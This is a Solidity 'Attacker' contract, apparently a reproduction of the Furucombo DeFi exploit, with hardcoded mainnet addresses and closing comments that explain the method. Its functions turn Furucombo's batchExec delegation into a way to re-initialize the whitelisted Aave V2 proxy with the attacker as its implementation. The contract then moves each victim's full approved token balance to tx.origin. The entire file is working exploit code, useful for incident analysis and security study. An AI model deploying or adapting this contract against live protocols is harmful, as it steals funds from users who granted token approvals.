//SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import "hardhat/console.sol";
import "./IERC20.sol";
import "./Proxy.sol";

contract Attacker {
    IProxy public constant furucombo =
        IProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
    IAaveV2Proxy public constant aaveV2Proxy =
        IAaveV2Proxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    // set implementation to attacker contract
    function setup() external payable {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);

        tos[0] = address(aaveV2Proxy);
        datas[0] = abi.encodeWithSelector(
            aaveV2Proxy.initialize.selector,
            address(this),
            ""
        );
        furucombo.batchExec(tos, configs, datas);
    }

    // double-delegation chain to call into attacker contract
    function performAttack(IERC20 token, address sender) external payable {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        tos[0] = address(aaveV2Proxy);
        datas[0] = abi.encodeWithSelector(
            this.attackDelegated.selector,
            token,
            sender
        );
        furucombo.batchExec(tos, configs, datas);
    }

    function attackDelegated(IERC20 token, address sender) external payable {
        token.transferFrom(sender, tx.origin, token.balanceOf(sender));
    }
}

// https://ethtx.info/mainnet/0x6a14869266a1dcf3f51b102f44b7af7d0a56f1766e5b1908ac80a6a23dbaf449
// ref/InitializableUpgradeabilityProxy.sol
// ref/Furucombo.sol
//
// Since aaveV2Proxy is whitelisted and passed registry._isValid(aaveV2Proxy)
// setup() is to spoof AaveV2 Proxy initialize(this, "") to set the implementation to the attacker contract
// performAttack() is then to perform attack forwarding funds using transferFrom()
